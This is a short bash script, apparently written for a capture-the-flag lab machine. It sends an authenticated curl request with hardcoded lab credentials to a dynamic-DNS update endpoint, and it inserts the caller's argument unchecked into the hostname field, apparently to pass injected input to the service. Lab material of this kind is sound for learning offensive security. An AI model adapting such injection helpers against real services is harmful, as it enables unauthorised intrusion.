#!/bin/bash

echo "$1"

curl -i -s -k -G \
    -H $'Host: dyna.htb'\
    -H $'Accept-Encoding: gzip, deflate' \
    --basic -u $'dynadns:sndanyd' \
    --data-urlencode "hostname=${1}.dynamicdns.htb" \
    --data-urlencode $'myip=1.2.3.4' \
    $'http://dyna.htb/nic/update'
